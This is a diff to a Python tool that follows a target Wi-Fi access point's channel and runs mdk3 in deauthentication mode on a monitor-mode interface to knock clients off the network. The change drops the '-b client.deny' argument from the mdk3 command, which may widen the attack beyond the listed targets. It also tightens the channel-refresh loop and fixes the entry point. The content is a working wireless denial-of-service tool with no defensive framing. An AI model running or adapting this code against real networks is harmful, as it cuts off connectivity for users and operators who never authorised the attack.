@@ -9,7 +9,7 @@ import click
 from rich.console import Console
 from rich.traceback import install
 
-from .logger import logger
+from logger import logger
 
 console: Console = Console()
 
@@ -27,7 +27,7 @@ class Target:
         return cls.obj
 
     def __init__(self, bssid: str) -> None:
-        self.bssid = bssid
+        self.bssid = bssid.lower()
         self.channel = None
 
     def __setattr__(self, name: str, value: Any, /) -> None:
@@ -69,7 +69,7 @@ class Target:
 
             threading.Thread(
                 target=subprocess.run,
-                args=(["sudo", "mdk3", "wlan0mon", "d", "-b", "client.deny"],),
+                args=(["sudo", "mdk3", "wlan0mon", "d"],),
                 kwargs={"stdout": open(os.devnull, "wt")},
             ).start()
 
@@ -138,13 +138,13 @@ def refresh(interface: str):
                 logger.info(f"Update channel to {channel!r}.")
                 Target.obj.channel = channel
 
-                logger.info("Sleep 60 for seconds.")
-                sleep(60)
+                logger.info("Sleep 15 for seconds.")
+                sleep(15)
 
 
 @click.command()
 @click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
-def main(bssid: str, channel: int) -> None:
+def main(bssid: str) -> None:
     threading.Thread(target=refresh, args=("wlan0",)).start()
 
     Target(bssid)
